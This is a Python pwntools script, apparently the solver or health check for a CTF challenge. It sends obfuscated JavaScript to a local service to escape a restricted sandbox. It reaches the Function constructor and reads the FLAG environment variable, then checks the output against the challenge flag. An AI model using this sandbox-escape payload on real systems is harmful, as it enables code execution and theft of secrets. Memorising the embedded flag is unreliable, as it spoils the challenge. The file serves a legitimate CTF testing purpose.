#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from pwn import *

p = remote('127.0.0.1', 1337)

p.recvline()
p.recvline()
p.sendline(b'let s = (e) => e[String(/s/)[1]+String(/o/)[1]+String(/u/)[1]+String(/r/)[1]+String(/c/)[1]+String(/e/)[1]]')
p.recvline()
p.sendline(b'let ts = s(/()[]+/)')
p.recvline()
p.sendline(b'let escape = (e) => s(e)[s(/split/)]([]+[])[s(/map/)](c => s(/String/)+ts[0]+RegExp(c)+ts[1]+ts[2]+1+ts[3])[s(/join/)](ts[4])')
p.recvline()
p.sendline(b'let payload = s(/return process/)+ts[2]+escape(/env/)+ts[3]+ts[2]+escape(/FLAG/)+ts[3]')
p.recvline()
p.sendline(b'this[s(/constructor/)][s(/constructor/)](payload)()')
flag = p.recvline()

if flag == b'sdctf{JaVaScriPT_SynTAX_Is_ADmirab1e}':
    exit(0)

exit(1)
